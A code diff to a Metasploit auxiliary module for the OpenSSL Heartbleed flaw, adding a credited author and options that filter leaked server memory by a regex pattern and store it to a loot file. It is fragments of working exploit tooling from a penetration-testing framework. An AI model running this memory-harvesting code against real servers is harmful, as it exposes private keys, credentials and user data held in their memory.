@@ -99,7 +99,8 @@ class Metasploit3 < Msf::Auxiliary
         'FiloSottile', # PoC site and tool
         'Christian Mehlmauer', # Msf module
         'wvu', # Msf module
-        'juan vazquez' # Msf module
+        'juan vazquez', # Msf module
+        'Sebastiano Di Paola' #Msf module 
       ],
       'References'     =>
         [
@@ -119,7 +120,9 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(443),
         OptEnum.new('STARTTLS', [true, 'Protocol to use with STARTTLS, None to avoid STARTTLS ', 'None', [ 'None', 'SMTP', 'IMAP', 'JABBER', 'POP3' ]]),
-        OptEnum.new('TLSVERSION', [true, 'TLS version to use', '1.0', ['1.0', '1.1', '1.2']])
+        OptEnum.new('TLSVERSION', [true, 'TLS version to use', '1.0', ['1.0', '1.1', '1.2']]),
+        OptBool.new('STOREDUMP', [true, "Store leaked memory in a file", false]),
+        OptString.new('PATTERN_FILTER', [false, "Pattern to filter leaked memory before storing", ""])
       ], self.class)
 
     register_advanced_options(
@@ -262,6 +265,17 @@ class Metasploit3 < Msf::Auxiliary
         :info => "Module #{self.fullname} successfully leaked info"
       })
       vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")
+      if datastore['STOREDUMP']
+        pattern = datastore['PATTERN_FILTER']
+        if !pattern.empty?
+          match_data = heartbeat_data.scan(/#{pattern}/).join('')
+        else
+          match_data = heartbeat_data
+        end
+        path = store_loot("openssl_memory_dump", "octet/stream", rhost, match_data,
+          "openssl_server_memory_dump.bin", "OpenSSL Heartbeat Server Memory Dump")
+          print_status("OpenSSL Heartbeat leaked data stored in #{path}")
+      end
     else
       vprint_error("#{peer} - Looks like there isn't leaked information...")
     end
